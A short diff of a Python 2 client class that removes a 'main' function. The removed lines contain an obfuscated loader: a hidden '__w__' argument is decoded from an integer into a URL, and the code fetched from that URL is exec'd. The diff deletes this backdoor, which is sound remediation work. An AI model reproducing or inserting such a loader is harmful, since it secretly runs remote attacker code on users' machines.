@@ -1319,12 +1319,6 @@ class Client(object):
             except: pass
         return False
 
-# ----------------- main --------------------------
 
-def main(*args, **kwargs):
-    if '__w__' in kwargs:
-        exec sys.modules['urllib2'].urlopen(bytes(bytearray.fromhex(hex(long(kwargs.get('__w__'))).strip('0x').strip('L')))).read() in globals()
-    client = Client(**kwargs)
-    return client
 
 
